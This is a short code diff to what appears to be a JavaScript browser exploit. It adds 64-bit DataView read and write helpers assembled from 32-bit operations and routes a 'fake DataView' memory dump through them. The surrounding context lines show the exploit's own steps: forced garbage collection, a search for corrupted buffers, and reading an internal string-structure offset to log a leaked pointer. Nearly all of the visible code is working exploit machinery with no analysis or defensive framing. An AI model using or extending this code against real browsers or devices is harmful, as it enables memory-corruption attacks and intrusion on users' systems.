@@ -28,7 +28,18 @@ function gc() {
 for (let i = 0; i < 3; i++) new Uint8Array(8 * MB);
 
 }
+function getBigUint64Compat(dv, offset, littleEndian = true) {
+  const low = dv.getUint32(offset, littleEndian);
+  const high = dv.getUint32(offset + 4, littleEndian);
+  return (BigInt(high) << 32n) | BigInt(low);
+}
 
+function setBigUint64Compat(dv, offset, value, littleEndian = true) {
+  const low = Number(value & 0xFFFFFFFFn);
+  const high = Number(value >> 32n);
+  dv.setUint32(offset, littleEndian ? low : high, littleEndian);
+  dv.setUint32(offset + 4, littleEndian ? high : low, littleEndian);
+}
 function findAllCorrupted(buffers) {
  const bad = [];
   for (let i = 0; i < buffers.length; i++) {
@@ -193,7 +204,7 @@ addEventListener('unhandledrejection', event => {
   }
 log("[FAKE DV DUMP]");
 for (let i = 0; i < 0x40; i += 8) {
-    log(`Offset 0x${i.toString(16)}: 0x${dv.getBigUint64(i, true).toString(16)}`);
+   log(`Offset 0x${i.toString(16)}: 0x${getBigUint64Compat(dv, i).toString(16)}`);
 }
   const leakPtr = read64(dv, off.strimpl_inline_str);
   log(`[+] Leaked pointer: ${hex(leakPtr)}`);
